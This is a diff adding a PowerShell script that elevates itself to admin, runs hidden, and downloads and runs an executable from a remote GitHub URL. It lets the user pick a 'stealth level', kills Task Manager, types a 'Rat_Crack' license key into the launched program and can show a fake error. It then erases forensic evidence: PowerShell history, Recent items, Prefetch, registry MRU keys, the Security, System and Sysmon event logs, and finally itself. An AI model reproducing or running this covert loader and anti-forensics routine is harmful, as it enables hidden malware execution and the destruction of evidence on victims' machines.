@@ -1,0 +1,259 @@
+# =====================================================
+# Self-Elevate (with a visible prompt first, then hidden)
+# =====================================================
+# First, we need to show the level selector GUI.
+# We'll do it in a non-elevated context so the GUI appears.
+# After the user chooses, we re-launch with admin and hidden.
+
+# Check if we are already elevated. If not, we'll show the GUI, then elevate.
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+if (-not $isAdmin) {
+    # Show the level selection GUI (will run as normal user)
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-Type -AssemblyName System.Drawing
+
+    $form = New-Object System.Windows.Forms.Form
+    $form.Text = "Select Blantant Level"
+    $form.Size = New-Object System.Drawing.Size(300, 200)
+    $form.StartPosition = "CenterScreen"
+
+    $label = New-Object System.Windows.Forms.Label
+    $label.Text = "Choose level 1-4:`n1=Stealthiest`n4=Most Obvious"
+    $label.Location = New-Object System.Drawing.Point(20, 20)
+    $label.Size = New-Object System.Drawing.Size(240, 80)
+    $form.Controls.Add($label)
+
+    $textBox = New-Object System.Windows.Forms.TextBox
+    $textBox.Location = New-Object System.Drawing.Point(20, 110)
+    $textBox.Size = New-Object System.Drawing.Size(100, 20)
+    $form.Controls.Add($textBox)
+
+    $button = New-Object System.Windows.Forms.Button
+    $button.Text = "OK"
+    $button.Location = New-Object System.Drawing.Point(140, 110)
+    $button.Size = New-Object System.Drawing.Size(75, 23)
+    $button.Add_Click({
+        $form.Tag = $textBox.Text
+        $form.Close()
+    })
+    $form.Controls.Add($button)
+
+    $form.ShowDialog() | Out-Null
+
+    $level = $form.Tag
+    if (-not ($level -match '^[1-4]$')) {
+        [System.Windows.Forms.MessageBox]::Show("Invalid input. Please enter 1-4.", "Error", "OK", "Error")
+        exit
+    }
+
+    # Now re-launch with admin and pass the level as an argument
+    $scriptPath = $PSCommandPath
+    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`" -level $level"
+    Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList $arguments
+    exit
+}
+
+# =====================================================
+# Now we are elevated, and the level is passed as an argument
+# =====================================================
+param([string]$level)
+
+# Hide the current console (if any)
+$hwnd = (Get-Process -Id $pid).MainWindowHandle
+if ($hwnd -ne [IntPtr]::Zero) {
+    Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class Win32 {
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+}
+"@
+    [Win32]::ShowWindow($hwnd, 0) | Out-Null
+}
+
+# Add Win32 API for window handling
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+
+public class WindowAPI {
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    [DllImport("user32.dll", SetLastError = true)]
+    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
+    [DllImport("user32.dll")]
+    public static extern bool SetForegroundWindow(IntPtr hWnd);
+    [DllImport("user32.dll")]
+    public static extern bool BringWindowToTop(IntPtr hWnd);
+}
+"@
+
+# === Configuration ===
+$licenseKey = "Rat_Crack_Lv1"
+$exeUrl = "https://raw.githubusercontent.com/TSTEAM865/fafawfqf/main/cmd.exe"
+
+# === Blantant level behavior ===
+switch ($level) {
+    "1" {
+        $windowStyle = "Hidden"
+        $delayBeforeSend = 1
+        $hideTargetAfterSend = $true
+        $showFakeError = $false
+    }
+    "2" {
+        $windowStyle = "Hidden"
+        $delayBeforeSend = 3
+        $hideTargetAfterSend = $true
+        $showFakeError = $false
+    }
+    "3" {
+        $windowStyle = "Normal"
+        $delayBeforeSend = 4
+        $hideTargetAfterSend = $true
+        $showFakeError = $false
+    }
+    "4" {
+        $windowStyle = "Normal"
+        $delayBeforeSend = 5
+        $hideTargetAfterSend = $false
+        $showFakeError = $true
+        # Show a fake error before proceeding
+        Add-Type -AssemblyName System.Windows.Forms
+        [System.Windows.Forms.MessageBox]::Show("An error occurred. Please restart the application.", "Error", "OK", "Error")
+    }
+    default {
+        $windowStyle = "Hidden"
+        $delayBeforeSend = 3
+        $hideTargetAfterSend = $true
+        $showFakeError = $false
+    }
+}
+
+# === Clear Temp ===
+$tempDir = $env:TEMP
+try {
+    Get-ChildItem -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
+} catch {}
+
+# === Download EXE ===
+$randomGuid = [System.Guid]::NewGuid().ToString()
+$exeFileName = "$randomGuid.exe"
+$exePath = Join-Path $env:TEMP $exeFileName
+
+try {
+    $webClient = New-Object System.Net.WebClient
+    $webClient.DownloadFile($exeUrl, $exePath)
+    $webClient.Dispose()
+} catch {
+    exit 1
+}
+if (-not (Test-Path $exePath)) { exit 1 }
+
+# === Kill conflicts ===
+foreach ($pName in @("taskmgr", "notepad")) {
+    $procs = Get-Process -Name $pName -ErrorAction SilentlyContinue
+    if ($procs) {
+        foreach ($p in $procs) {
+            try { Stop-Process -Id $p.Id -Force -ErrorAction Stop } catch {}
+        }
+    }
+}
+Start-Sleep -Milliseconds 500
+
+# === Launch EXE ===
+if ($windowStyle -eq "Hidden") {
+    $proc = Start-Process -FilePath $exePath -WindowStyle Hidden -PassThru
+} else {
+    $proc = Start-Process -FilePath $exePath -PassThru
+}
+
+Start-Sleep -Seconds $delayBeforeSend
+
+# === Bring to foreground and send key ===
+$hwnd = $proc.MainWindowHandle
+if ($hwnd -eq [IntPtr]::Zero) {
+    $hwnd = [WindowAPI]::FindWindow($null, "SKYNET - DEMOSHOP")
+    if ($hwnd -eq [IntPtr]::Zero) {
+        $hwnd = [WindowAPI]::FindWindow($null, "DEMOSHOP")
+    }
+}
+
+if ($hwnd -ne [IntPtr]::Zero) {
+    [WindowAPI]::SetForegroundWindow($hwnd) | Out-Null
+    [WindowAPI]::BringWindowToTop($hwnd) | Out-Null
+    Start-Sleep -Milliseconds 500
+}
+
+Add-Type -AssemblyName System.Windows.Forms
+[System.Windows.Forms.SendKeys]::SendWait($licenseKey)
+[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
+
+if ($hideTargetAfterSend -and $hwnd -ne [IntPtr]::Zero) {
+    [WindowAPI]::ShowWindow($hwnd, 0) | Out-Null
+}
+
+# === Cleanup ===
+Start-Sleep -Seconds 2
+if (Test-Path $exePath) { Remove-Item $exePath -Force -ErrorAction SilentlyContinue }
+
+# Clear PowerShell history
+[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() 2>$null
+$histPath = (Get-PSReadLineOption).HistorySavePath
+if (Test-Path $histPath) { Set-Content -Path $histPath -Value "" -Force -ErrorAction SilentlyContinue }
+
+# Clear recent, jump lists, prefetch, etc.
+$recentPath = Join-Path $env:APPDATA "Microsoft\Windows\Recent"
+if (Test-Path $recentPath) {
+    Get-ChildItem -Path $recentPath -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
+}
+
+$jumpPaths = @(
+    "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations",
+    "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations"
+)
+foreach ($p in $jumpPaths) {
+    if (Test-Path $p) {
+        Get-ChildItem -Path $p -Force -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+    }
+}
+
+$prefetchPath = "C:\Windows\Prefetch"
+for ($i=0; $i -lt 3; $i++) {
+    Start-Sleep -Milliseconds 500
+    if (Test-Path $prefetchPath) {
+        Get-ChildItem -Path $prefetchPath -Filter "*.pf" -Force -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+    }
+}
+
+# Clear registry MRU
+$mruKeys = @(
+    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
+    "HKCU:\Software\Microsoft\Windows\ShellNoRoam\BagMRU",
+    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths"
+)
+foreach ($k in $mruKeys) {
+    if (Test-Path $k) {
+        Remove-Item -Path $k -Recurse -Force -ErrorAction SilentlyContinue
+        New-Item -Path $k -Force -ErrorAction SilentlyContinue | Out-Null
+    }
+}
+
+# Clear event logs
+$logs = @("Application","Security","System","Microsoft-Windows-PowerShell/Operational","Microsoft-Windows-Sysmon/Operational")
+foreach ($log in $logs) {
+    wevtutil cl $log 2>$null
+}
+
+# Delete script itself
+if ($PSCommandPath -and (Test-Path $PSCommandPath)) {
+    Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue
+}
+
+# === Show "Done" message ===
+Add-Type -AssemblyName System.Windows.Forms
+[System.Windows.Forms.MessageBox]::Show("Done", "Complete", "OK", "Information")
+
+[GC]::Collect()
+exit
